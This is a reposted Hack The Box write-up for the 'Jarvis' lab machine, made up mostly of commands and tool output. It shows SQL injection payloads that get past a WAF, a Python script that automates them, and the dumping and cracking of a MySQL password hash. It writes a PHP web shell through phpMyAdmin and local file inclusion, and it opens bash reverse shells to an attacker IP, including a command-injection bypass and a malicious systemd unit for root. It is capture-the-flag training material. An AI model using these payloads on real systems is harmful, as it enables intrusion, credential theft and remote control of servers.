# [HTB] Jarvis Writeup

> 原文: https://www.ctfiot.com/89735.html
> ID: 89735


```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



```
00       68l      167w     2237c http://supersecurehotel.htb/footer.php
200      543l     1653w        0c http://supersecurehotel.htb/index.php
200       43l       85w     1333c http://supersecurehotel.htb/nav.php
200      336l     2992w    19186c http://supersecurehotel.htb/phpmyadmin/ChangeLog
200      339l     2968w    18092c http://supersecurehotel.htb/phpmyadmin/LICENSE
200       52l      212w     1520c http://supersecurehotel.htb/phpmyadmin/README
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/ajax.php
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/changelog.php
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/export.php
200       98l      278w    22486c http://supersecurehotel.htb/phpmyadmin/favicon.ico
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/index.php
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/import.php
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/license.php
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/logout.php
200      216l      728w        0c http://supersecurehotel.htb/phpmyadmin/navigation.php
```



```
HTTP/1.1 200 OK
Date: Sat, 27 Nov 2021 03:56:21 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
IronWAF: 2.0.3
Content-Length: 23628
Connection: close
Content-Type: text/html; charset=UTF-8
```



```
select cod_id,room_id,room_price from room where cod_id=<传递的cod参数>
```



```
# 判断注入点到的查询 SQL 字段为 7 列
GET /room.php?cod=2/**/order/**/by/**/8%23/**/    false
GET /room.php?cod=2/**/order/**/by/**/7%23/**/    true

# 使用连接查询替换真实数据，寻找子查询信息输出位置
GET /room.php?cod=-1/**/union/**/select/**/1,2,3,4,5,6,7%23/**/ true
```



```
cod: 1/**/And/**/3385/**/beTwEen/**/3385/**/And/**/3385--/**/phfx
```



```
#!/bin/python3
# -*- coding: UTF-8 -*-

import sys
import requests
import re

url = "http://10.10.10.143/room.php?cod=-1/**/union/**/select/**/1,2,({0}),4,5,6,7"
payload = sys.argv[1].replace(' ', '/**/')
s = requests.session()

r = s.request("GET", url=url.format(payload) + '%23')
print("send payload: " + payload)
print

if r.status_code != 200:
    print('Error')
    exit()

reg_arr = re.findall(r'class="price-room">(.*)</span>',r.text)
print('-'*20)
print(reg_arr[0])
print('-'*20)
```



```
# 获取所有数据库名称
send payload: select group_concat(schema_name) from information_schema.schemata
--------------------
hotel,information_schema,mysql,performance_schema
--------------------

# 获取当前数据库的表名
send payload: select group_concat(table_name) from information_schema.tables where table_schema=database()
--------------------
room
--------------------

# 获取mysql账户密码
send payload: select concat(host,0x3a,user,0x3a,password) from mysql.user
--------------------
localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
--------------------

# 使用 hashcat 配合字典成功得到明文密码
*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0:imissyou
```



```
php：select '<?php system("bash -c 'sh -i >& /dev/tcp/10.10.17.64/9900 0>&1'"); ?>'

payload：/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxxxxxx
```



```
$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/home/pepper$
```



```
...snip...
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    ...snip...
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```



```
$ echo 123`pwd`
123/tmp

$ echo 123$(pwd)
123/tmp
```



```
echo -e '#!/bin/bashnnbash -c "sh -i >& /dev/tcp/10.10.17.64/9900 0>&1"' > /tmp/shell
chmod +x /tmp/shell
```



```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "sh -i >& /dev/tcp/10.10.17.64/9900 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/4-1672755583.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1672755584.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1672755585.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/2-1672755586.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/6-1672755587.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/8-1672755587.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/5-1672755588.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672755588.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/9-1672755589.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/01/3-1672755590.png)